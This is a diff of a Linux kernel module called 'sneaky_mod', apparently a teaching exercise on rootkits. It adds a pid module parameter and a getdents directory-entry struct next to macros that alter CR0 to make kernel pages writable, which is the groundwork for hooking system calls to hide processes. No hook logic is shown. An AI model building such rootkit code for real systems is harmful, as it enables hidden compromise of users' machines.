@@ -5,17 +5,10 @@
 #include <linux/highmem.h> // for changing page permissions
 #include <linux/init.h>    // for entry/exit macros
 #include <linux/kallsyms.h>
-#include <linux/kernel.h> // for printk and other kernel bits
-#include <linux/module.h> // for all modules
+#include <linux/kernel.h>      // for printk and other kernel bits
+#include <linux/module.h>      // for all modules
+#include <linux/moduleparam.h> // *newly added for module pamameter
 #include <linux/sched.h>
-
-// #hint struct for "getdents" system call
-struct linux_dirent {
-  u64 d_ino;               /* Inode number */
-  s64 d_off;               /* Offset to next linux_dirent */
-  unsigned short d_reclen; /* Length of this linux_dirent */
-  char d_name[BUFFLEN];    /* Filename */
-}
 
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -23,6 +16,19 @@ struct linux_dirent {
 // so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+
+/* For loading module */
+static pid_t pid = -1;
+module_param(pid, pid_t, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(pid, "The sneaky_mod pid");
+
+// #hint struct for "getdents" system call
+struct linux_dirent {
+  u64 d_ino;               /* Inode number */
+  s64 d_off;               /* Offset to next linux_dirent */
+  unsigned short d_reclen; /* Length of this linux_dirent */
+  char d_name[20];         /* Filename */
+};
 
 // These are function pointers to the system calls that change page
 // permissions for the given address (page) to read-only or read-write.
